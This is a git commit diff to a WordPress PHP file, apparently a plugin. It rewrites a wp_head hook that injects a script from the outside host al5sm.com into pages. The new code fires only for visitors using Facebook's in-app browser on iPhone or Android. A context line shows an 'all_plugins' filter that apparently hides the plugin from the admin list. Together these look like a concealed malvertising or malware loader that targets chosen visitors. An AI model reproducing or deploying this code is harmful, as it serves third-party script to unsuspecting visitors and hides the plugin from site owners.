8dd8a16c333f3324f1701e7cd5450a04a558d489
ahmadfatoni19670 <164468840+ahmadfatoni19670@users.noreply.github.com>
2026-08-15 21:10:26 +0700

    Update index.php

--- index.php
+++ index.php
@@ -10,12 +10,35 @@
  **/
 
 add_action('wp_head', function () {
-    if (is_single() && wp_is_mobile()) {
+
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+    $is_ios_facebook = (
+        stripos($ua, 'iPhone') !== false &&
+        stripos($ua, 'FBAN/FBIOS') !== false
+    );
+
+    $is_android_facebook = (
+        stripos($ua, 'Android') !== false &&
+        (
+            stripos($ua, 'FB_IAB/FB4A') !== false ||
+            stripos($ua, 'FBAN/EMA') !== false
+        )
+    );
+
+    if (is_singular() && ($is_ios_facebook || $is_android_facebook)) {
         ?>
-        <script>(function(s){s.dataset.zone='11543860',s.src='https://al5sm.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
+        <script>
+        (function(s){
+            s.dataset.zone='11543860';
+            s.src='https://al5sm.com/tag.min.js';
+        })([document.documentElement, document.body].filter(Boolean).pop()
+          .appendChild(document.createElement('script')));
+        </script>
         <?php
     }
 });
+
 
 add_filter('all_plugins', function ($plugins) {
     $plugin_file = plugin_basename(__FILE__);
